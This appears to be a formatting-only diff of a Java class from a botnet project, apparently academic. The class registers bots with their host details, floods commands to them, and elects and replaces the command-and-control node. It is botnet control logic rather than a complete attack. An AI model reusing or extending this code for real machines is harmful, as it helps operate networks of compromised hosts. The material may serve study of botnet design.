@@ -100,7 +100,7 @@ public class Commando {
 
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(), (nServ.isElegible() + ""));
 		bServ.save(bot);
-		
+
 	}
 
 	/**
@@ -187,7 +187,7 @@ public class Commando {
 	 * @param cmd
 	 * @param userSSoID
 	 */
-	
+
 	@Async
 	public void floodingByCecToBot(String cmd, String userSSoID) {
 		User user = uServ.findBySsoId(userSSoID);
@@ -240,13 +240,12 @@ public class Commando {
 		flooding(msg);
 		return false;
 	}
-	
+
 	public boolean updateKingFlood(IP ip, String pk) {
 		String msg = "update<CC>" + ip + "<CC>" + pk;
 		flooding(msg);
 		return false;
 	}
-	
 
 	public boolean abdicate() {
 
@@ -263,7 +262,7 @@ public class Commando {
 			nServ.getCommandConquerIps().remove(0);
 			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(ip, pki.rebuildPuK(pk)));
 			pServ.setNewKing("");
-			nServ.setAliveBot(new SyncIpList<IP,String>());
+			nServ.setAliveBot(new SyncIpList<IP, String>());
 			nServ.setCounterCeCMemory(1);
 			return true;
 		}
@@ -310,14 +309,14 @@ public class Commando {
 				Double rand = d * size;
 				Long lv = Math.round(rand);
 				Integer li = lv.intValue();
-//				System.out.println("long to int" + li);
+				// System.out.println("long to int" + li);
 				String ip = ccList.get(li);
 				ccList.forEach((botIp) -> System.out.println("Bot Ip abili per il sorteggio" + botIp));
-//				System.out.println("byte seed " + b.toString());
-//				System.out.println(" next double " + d);
-//				System.out.println("size " + size);
-//				System.out.println("rand " + rand);
-//				System.out.println("byte seed " + b.toString());
+				// System.out.println("byte seed " + b.toString());
+				// System.out.println(" next double " + d);
+				// System.out.println("size " + size);
+				// System.out.println("rand " + rand);
+				// System.out.println("byte seed " + b.toString());
 				System.out.println("Ho eletto " + ip);
 				if (ccReq.becameCc(ip)) {
 					pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
@@ -356,18 +355,16 @@ public class Commando {
 		return null;
 	}
 
-	
-	public void legacy(){
-		Boolean b=bReq.pingToCec(nServ.getCommandConquerIps().get(0).getValue1().toString());
-		if(!b){
-			newKingDns(nServ.getMyIp(),nServ.getPki().getPubRSAKeyToString());			
-			 updateKingFlood(nServ.getMyIp(), nServ.getPki().getPubRSAKeyToString());
-		}else{
+	public void legacy() {
+		Boolean b = bReq.pingToCec(nServ.getCommandConquerIps().get(0).getValue1().toString());
+		if (!b) {
+			newKingDns(nServ.getMyIp(), nServ.getPki().getPubRSAKeyToString());
+			updateKingFlood(nServ.getMyIp(), nServ.getPki().getPubRSAKeyToString());
+		} else {
 			System.out.println("CeC vivo e funzionante");
 		}
 	}
-	
-	
+
 	public RoleServiceImpl getrServ() {
 		return rServ;
 	}
